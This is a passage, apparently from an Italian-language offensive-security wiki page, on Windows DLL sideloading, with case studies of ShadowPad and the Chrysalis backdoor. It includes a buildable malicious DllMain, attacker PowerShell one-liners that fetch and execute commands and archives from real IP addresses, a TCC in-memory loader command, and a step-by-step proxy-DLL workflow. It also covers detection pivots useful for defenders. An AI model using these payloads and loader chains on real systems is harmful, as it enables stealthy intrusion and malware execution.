- In Orca (Microsoft Orca.exe), ispeziona le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload embedded/split nel CAB dell'MSI:
- Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oppure usa lessmsi: lessmsi x package.msi C:\out
- Cerca più frammenti piccoli che vengono concatenati e decryptati da una VBScript CustomAction. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Drop these two files in the same folder:
- wsc_proxy.exe: host firmato legittimo (Avast). Il processo tenta di caricare wsc.dll per nome dalla propria directory.
- wsc.dll: DLL dell'attaccante. Se non sono richieste export specifiche, DllMain può bastare; altrimenti, crea una proxy DLL e inoltra gli export richiesti alla libreria genuina mentre esegui il payload in DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di export, usa un framework di proxying (ad es. DLLirant/Spartacus) per generare una forwarding DLL che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione del nome DLL da parte del binary host. Se l’host usa absolute paths o safe loading flags (ad es. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l’hijack può fallire.
- KnownDLLs, SxS e forwarded exports possono influenzare la precedenza e devono essere considerati durante la selezione del binary host e del set di export.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade di tre file** per mimetizzarsi come software legittimo mantenendo il core payload encrypted su disco:

1. **Signed host EXE** – vendor come AMD, Realtek o NVIDIA vengono abusati (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attacker rinominano l’executable per farlo sembrare un Windows binary (per esempio `conhost.exe`), ma la firma Authenticode resta valida.
2. **Malicious loader DLL** – posizionata accanto all’EXE con un nome atteso (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è di solito un binary MFC offuscato con il framework ScatterBrain; il suo unico compito è localizzare il blob encrypted, decryptarlo e mappare ShadowPad in modo reflective.
3. **Encrypted payload blob** – spesso memorizzato come `<name>.tmp` nella stessa directory. Dopo aver memory-mapped il payload decrypted, il loader cancella il file TMP per distruggere le evidenze forensi.

Note di tradecraft:

* Rinominare l’EXE signed (mantenendo però l’`OriginalFileName` originale nell’header PE) gli permette di masqueradare come un Windows binary pur mantenendo la vendor signature, quindi replica l’abitudine di Ink Dragon di rilasciare binary che sembrano `conhost.exe` ma in realtà sono utility AMD/NVIDIA.
* Poiché l’executable rimane trusted, la maggior parte dei controlli di allowlisting richiede solo che la tua malicious DLL sia affiancata. Concentrati sulla personalizzazione della loader DLL; il parent signed in genere può essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP si trovi accanto al loader e che sia writable, così può azzerare il file dopo il mapping. Mantieni la directory writable finché il payload non viene caricato; una volta in memory, il file TMP può essere cancellato in sicurezza per OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Gli operatori combinano DLL sideloading con LOLBAS così che l’unico artefatto custom su disco sia la malicious DLL accanto al trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell avvia `cmd.exe /c`, preleva i comandi da un Finger server e li invia a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` recupera testo TCP/79; `| cmd` esegue la risposta del server, permettendo agli operatori di ruotare il secondo stage lato server.

- **Built-in download/extract:** Scarica un archive con un’estensione benign, lo decomprime e prepara il target del sideload insieme alla DLL sotto una cartella casuale in `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` nasconde il progresso e segue i redirect; `tar -xf` usa il tar integrato in Windows.

- **WMI/CIM launch:** Avvia l’EXE via WMI così che la telemetria mostri un processo creato via CIM mentre carica la DLL co-localizzata:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funziona con binary che preferiscono DLL locali (ad es. `intelbq.exe`, `nearby_share.exe`); il payload (ad es. Remcos) gira sotto il nome trusted.

- **Hunting:** Genera alert su `forfiles` quando `/p`, `/m` e `/c` compaiono insieme; è insolito fuori dagli admin script.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una recente intrusione Lotus Blossom ha abusato di una trusted update chain per distribuire un dropper impacchettato in NSIS che preparava un DLL sideload insieme a payload completamente in-memory.

Tradecraft flow
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca come **HIDDEN**, rilascia un Bitdefender Submission Wizard rinominato `BluetoothService.exe`, una malicious `log.dll` e un blob encrypted `BluetoothService`, quindi avvia l’EXE.
- L’host EXE importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` carica il blob via mmap; `LogWrite` lo decrypta con uno stream custom basato su LCG (costanti **0x19660D** / **0x3C6EF35F**, material della key derivato da un hash precedente), sovrascrive il buffer con shellcode plaintext, libera i temporanei e salta ad esso.
- Per evitare una IAT, il loader risolve le API hashando i nomi di export usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, poi applica un avalanche in stile Murmur (**0x85EBCA6B**) e confronta il risultato con salted target hashes.

Main shellcode (Chrysalis)
- Decrypta un main module simile a un PE ripetendo add/XOR/sub con la key `gQ2JR&9;` per cinque passaggi, poi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la risoluzione delle import.
- Ricostruisce runtime le stringhe dei nomi DLL tramite trasformazioni per-character di bit-rotate/XOR, poi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che percorre il **PEB → InMemoryOrderModuleList**, analizza ogni export table in blocchi da 4 byte con mixing in stile Murmur, e ricorre a `GetProcAddress` solo se l’hash non viene trovato.

Embedded configuration & C2
- La config vive dentro il file `BluetoothService` rilasciato all’**offset 0x30808** (size **0x980**) ed è RC4-decrypted con key `qwhvb^435h&*7`, rivelando la C2 URL e il User-Agent.
- I beacon costruiscono un host profile delimitato da punti, antepongono il tag `4Q`, poi RC4-encrypt con key `vAuig34%^325hGV` prima di `HttpSendRequestA` su HTTPS. Le responses vengono RC4-decrypted e smistate da uno switch di tag (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + casi di chunked transfer).
- La modalità di execution è governata dagli argomenti CLI: nessun argomento = installa persistenza (service/Run key) puntando a `-i`; `-i` rilancia se stesso con `-k`; `-k` salta l’installazione ed esegue il payload.

Alternate loader observed
- La stessa intrusione ha rilasciato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` accanto. Il source C fornito dall’attacker incorporava shellcode, lo compilava ed eseguiva in-memory senza toccare il disco con un PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Questa fase di compile-and-run basata su TCC importava `Wininet.dll` a runtime e prelevava una second-stage shellcode da un URL hardcoded, offrendo un loader flessibile che si mascherava da esecuzione di un compiler.

## Signed-host sideloading con export proxying + host thread parking

Alcune catene di DLL sideloading aggiungono **stability engineering** così che l'host legittimo resti vivo abbastanza a lungo da caricare pulitamente le fasi successive invece di crashare dopo il caricamento della DLL malevola.

Pattern osservato
- Deposita un EXE trusted accanto a una DLL malevola usando il nome di dependency atteso, come `version.dll`.
- La DLL malevola **proxies every expected export** verso la vera system DLL (per esempio `%SystemRoot%\\System32\\version.dll`) così la import resolution continua a riuscire e il processo host resta funzionante.
- Dopo il load, la DLL malevola **patches the host entry point** in modo che il main thread cada in un loop infinito di `Sleep` invece di uscire o eseguire code paths che terminerebbero il processo.
- Un nuovo thread svolge il vero lavoro malevolo: decrittare il nome o il path della next-stage DLL (RC4/XOR sono comuni), poi avviarla con `LoadLibrary`.

Perché è importante
- Il normale DLL proxying preserva la compatibilità API, ma non garantisce che l'host resti vivo abbastanza a lungo per le fasi successive.
- Mettere in parking il main thread in `Sleep(INFINITE)` è un modo semplice per mantenere residente il processo signed mentre il loader esegue decryption, staging o network bootstrap in un worker thread.
- Cercare solo un `DllMain` sospetto perde questo pattern se il comportamento interessante avviene dopo che l'host entry point è stato patchato e parte un thread secondario.

Workflow minimale
1. Copia l'EXE host signed e determina la DLL che risolve dalla directory locale.
2. Compila una proxy DLL che esporti le stesse funzioni e le inoltri alla DLL legittima.
3. In `DllMain(DLL_PROCESS_ATTACH)`, crea un worker thread.
4. Da quel thread, patcha l'host entry point o la routine di avvio del main thread in modo che cicli su `Sleep`.
5. Decripta il nome/config della next-stage DLL e chiama `LoadLibrary` oppure fai manual-map del payload.

Punti di pivot difensivi
- Processi signed che caricano `version.dll` o librerie comunemente simili dalla propria application directory invece che da `System32`.
- Patch di memoria all'entry point del processo poco dopo il load dell'immagine, soprattutto jump/call reindirizzati a `Sleep`/`SleepEx`.
- Thread creati da una proxy DLL che chiamano subito `LoadLibrary` su una seconda DLL con nome decrittato.
- Proxy DLL con tutti gli export posizionati accanto a vendor executable dentro directory di staging scrivibili come `ProgramData`, `%TEMP%` o path di archivi estratti.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
